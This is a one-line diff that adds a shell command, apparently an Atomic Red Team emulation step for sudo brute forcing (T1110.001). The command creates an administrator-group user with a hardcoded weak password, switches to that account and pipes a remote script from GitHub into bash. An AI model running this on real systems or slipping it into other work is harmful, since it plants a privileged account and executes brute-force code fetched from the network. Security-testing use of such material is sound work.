@@ -1,0 +1,1 @@
+useradd -G wheel -s /bin/bash -p $(openssl passwd -1 password123) art; su art; cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh |bash
